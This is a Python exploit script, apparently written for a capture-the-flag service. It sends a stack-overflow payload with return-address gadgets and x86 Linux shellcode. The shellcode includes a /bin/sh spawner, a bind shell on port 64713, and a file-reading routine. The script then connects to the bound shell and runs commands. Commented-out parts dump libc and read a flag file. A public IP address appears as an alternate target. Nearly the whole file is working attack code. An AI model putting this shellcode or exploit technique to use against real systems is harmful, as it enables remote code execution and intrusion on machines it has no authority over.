__author__ = 'HuyNA'
import sys
import os
import socket
import time
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# 23.23.190.205 6776 23.23.190.205:6776
host = "23.23.190.205"
local_host="192.168.248.155"
port = 6776

#s.connect((host, port))
s.connect((local_host, port))

"""
    push 0x01
	push 0x70
	push 0x0804AFF4
	push 0x04
	call [0x0804B060]
	nop
"""

print(s.recv(len("Log> ")+1))
stack_pivot_address_2 = struct.pack("<L", 0x08048819) # pop retn
stack_pivot_address = struct.pack("<L", 0x08048817)	# jmp esp
infor_string_address = struct.pack("<L", 0x08048E99)

# ham system()


address_to_send = struct.pack("<L", 0xB75E1FFF)
size_to_send = struct.pack("<L",0x01010101)

main_shellcode = "\x90"*12+"\x31\xc9\x6a\x04\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\xb0\x0b\x31\xd2\x31\xc9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80"

send_shellcode = "\x90"*12+"\x6a\x01\x68"+"\x01\x01\x01\x01"+"\x68"+address_to_send+"\x6a\x04\xff\x15\x60\xb0\x04\x08"
print(send_shellcode.encode("hex"))

# port 64713
bind_shellcode = "\x6a\x66"   \
  "\x58"			\
  "\x6a\x01"		\
  "\x5b"			\
  "\x99"			\
  "\x52"			\
  "\x53"			\
  "\x6a\x02"		\
  "\x89\xe1"		\
  "\xcd\x80"		\
  "\x52"			\
  "\x66\x68\xfc\xc9"\
  "\x66\x6a\x02"	\
  "\x89\xe1"		\
  "\x6a\x10"		\
  "\x51"			\
  "\x50"			\
  "\x89\xe1"		\
  "\x89\xc6"		\
  "\x43"			\
  "\xb0\x66"		\
  "\xcd\x80"		\
  "\xb0\x66"        \
  "\xd1\xe3"		\
  "\xcd\x80"		\
  "\x52"            \
  "\x56"			\
  "\x89\xe1"		\
  "\x43"			\
  "\xb0\x66"		\
  "\xcd\x80"		\
  "\x93"			\
  "\x6a\x02"		\
  "\x59"			\
  "\xb0\x3f"		\
  "\xcd\x80"		\
  "\x49"			\
  "\x79\xf9"		\
  "\x6a\x0b"		\
  "\x58"			\
  "\x52"			\
  "\x68\x2f\x2f\x73\x68"\
  "\x68\x2f\x62\x69\x6e"\
  "\x89\xe3"	\
  "\x52"		\
  "\x53"		\
  "\x89\xe1"	\
  "\xcd\x80"

connect_back_shellcode = ""

open_read_send = "\x89\xe3\x83" \
                 "\xc3\x70\x83" \
                 "\xc3\x70\x83" \
                 "\xc3\x70\x83" \
                 "\xc3\x70\x83" \
                 "\xc3\x70\x83" \
                 "\xc3\x22" \
                 "\x6a\x02" \
                 "\x59" \
                 "\x31\xd2" \
                 "\x66\xba\x09\x03" \
                 "\x6a\x05" \
                 "\x58" \
                 "\xcd\x80" \
                 "\x89\xc3" \
                 "\x89\xe1\x83\xc1\x70" \
                 "\x6a\x03" \
                 "\x58" \
                 "\xcd\x80" \
                 "\x89\xe1\x83\xc1\x70" \
                 "\x6a\x01\x6a\x70\x51\x6a\x04\xff\x15\x60\xb0\x04\x08"

shellcode = "b"*208 + infor_string_address + "c"*4 + "d"*4 + "e"*4 + stack_pivot_address + bind_shellcode
max_count = 8190
data1= "a"*99+":"+ shellcode + "\x90"*10 + "./flag\x00" +"\x21"*7

data = data1 + "\x01"*(max_count-len(data1)) + "\n"
print(len(data))
s.send(data)
time.sleep(1)

"""
libc_file = open("libc.dump", "wb")
libc_buffer = ""
data = s.recv(0x10000)
libc_buffer = data
i=0
try:
    while(len(data) >= 1):
        data = s.recv(0x10000)
        libc_buffer += data
        time.sleep(0.01)
        print(i)
        i += 1
finally:
    libc_file.write(libc_buffer)

print("end write file ...")
"""
"""
data = s.recv(1024)
print(data)
print("send command")

s.send("cat flag.txt\n")
time.sleep(1)
s.send("ls -l\n")
time.sleep(1)


print("recv ...")
data = s.recv(1024)
print(data)
print(s.recv(10240))
print(s.recv(10240))
print(s.recv(10240))
"""
time.sleep(5)
s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# 23.23.190.205 6776 23.23.190.205:6776
host1 = "23.23.190.205"
local_host1="192.168.248.155"
port1 = 64713
s1.connect((local_host1, port1))
#s1.connect((host1, port1))
s.send("ls -l\n")
print(s.recv(1024))